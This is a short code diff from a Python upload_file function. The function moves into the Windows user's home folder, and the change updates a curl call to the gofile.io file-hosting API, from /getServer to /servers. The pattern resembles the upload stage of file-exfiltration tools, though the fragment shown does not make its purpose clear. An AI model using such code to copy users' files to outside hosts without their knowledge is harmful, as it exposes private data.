@@ -21,7 +21,7 @@ def upload_file(file):
 
     os.chdir('C:\\Users\\' + username)
 
-    res = subprocess.check_output('curl -s https://api.gofile.io/getServer', shell=True).decode()
+    res = subprocess.check_output('curl -s https://api.gofile.io/servers', shell=True).decode()
 
     data = json.loads(res)
 
